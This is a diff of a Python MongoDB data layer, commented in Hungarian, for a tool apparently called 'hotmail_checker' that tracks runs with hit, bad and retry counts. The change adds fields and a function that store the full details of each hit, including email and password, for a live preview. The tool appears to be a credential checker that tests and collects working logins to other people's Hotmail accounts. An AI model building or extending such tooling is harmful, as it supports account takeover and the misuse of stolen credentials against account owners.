@@ -4,10 +4,8 @@ from typing import Optional
 import os
 from dotenv import load_dotenv
 
-# .env betöltése (ha van)
 load_dotenv()
 
-# MongoDB URL (Environment Variable-ből VAGY fallback)
 MONGODB_URL = os.getenv("MONGODB_URL")
 
 if not MONGODB_URL:
@@ -16,7 +14,6 @@ if not MONGODB_URL:
         "Állítsd be Environment Variable-ként a Render Dashboard-on!"
     )
 
-# MongoDB client
 try:
     client = AsyncIOMotorClient(MONGODB_URL)
     database = client.hotmail_checker
@@ -25,15 +22,10 @@ except Exception as e:
     print(f"❌ MongoDB hiba: {e}")
     raise
 
-# Collections
 users_collection = database.users
 runs_collection = database.runs
 
-# ============================================================
-# USER MODEL
-# ============================================================
 async def create_user(email: str, hashed_password: str):
-    """Új felhasználó létrehozása"""
     user = {
         "email": email,
         "password": hashed_password,
@@ -44,14 +36,9 @@ async def create_user(email: str, hashed_password: str):
     return str(result.inserted_id)
 
 async def get_user_by_email(email: str):
-    """Felhasználó lekérése email alapján"""
     return await users_collection.find_one({"email": email})
 
-# ============================================================
-# RUN MODEL (futtatások)
-# ============================================================
 async def create_run(user_id: str, keyword: str, total: int):
-    """Új futtatás létrehozása"""
     run = {
         "user_id": user_id,
         "keyword": keyword,
@@ -61,9 +48,11 @@ async def create_run(user_id: str, keyword: str, total: int):
         "custom": 0,
         "bad": 0,
         "retries": 0,
-        "status": "running",  # running, finished, error
+        "status": "running",
         "hit_lines": [],
         "custom_lines": [],
+        "hit_details": [],      # ← ÚJ: live preview-hoz (full adatok)
+        "custom_details": [],   # ← ÚJ: live preview-hoz (full adatok)
         "started_at": datetime.utcnow(),
         "finished_at": None
     }
@@ -71,7 +60,6 @@ async def create_run(user_id: str, keyword: str, total: int):
     return str(result.inserted_id)
 
 async def get_run(run_id: str):
-    """Egy futtatás lekérése"""
     from bson import ObjectId
     try:
         return await runs_collection.find_one({"_id": ObjectId(run_id)})
@@ -79,7 +67,6 @@ async def get_run(run_id: str):
         return None
 
 async def update_run_stats(run_id: str, stats: dict):
-    """Futtatás statisztikáinak frissítése"""
     from bson import ObjectId
     try:
         await runs_collection.update_one(
@@ -90,7 +77,7 @@ async def update_run_stats(run_id: str, stats: dict):
         pass
 
 async def add_result_to_run(run_id: str, result_type: str, line: str):
-    """Eredmény hozzáadása a futtatáshoz"""
+    """Eredmény hozzáadása (csak text sor)"""
     from bson import ObjectId
     field = "hit_lines" if result_type == "hit" else "custom_lines"
     try:
@@ -101,13 +88,26 @@ async def add_result_to_run(run_id: str, result_type: str, line: str):
     except:
         pass
 
+async def add_result_details_to_run(run_id: str, result_type: str, data: dict):
+    """
+    ÚJ! Teljes adatok mentése (live preview-hoz).
+    Ez MongoDB-be menti az email, password, country, name, stb. adatokat.
+    """
+    from bson import ObjectId
+    field = "hit_details" if result_type == "hit" else "custom_details"
+    try:
+        await runs_collection.update_one(
+            {"_id": ObjectId(run_id)},
+            {"$push": {field: data}}
+        )
+    except:
+        pass
+
 async def get_user_runs(user_id: str):
-    """Felhasználó összes futtatásának lekérése"""
     cursor = runs_collection.find({"user_id": user_id}).sort("started_at", -1)
     return await cursor.to_list(length=100)
 
 async def finish_run(run_id: str):
-    """Futtatás lezárása"""
     from bson import ObjectId
     try:
         await runs_collection.update_one(
@@ -121,7 +121,6 @@ async def finish_run(run_id: str):
         pass
 
 async def get_active_run(user_id: str):
-    """User aktív futtatásának lekérése (ha van)"""
     return await runs_collection.find_one({
         "user_id": user_id,
         "status": "running"
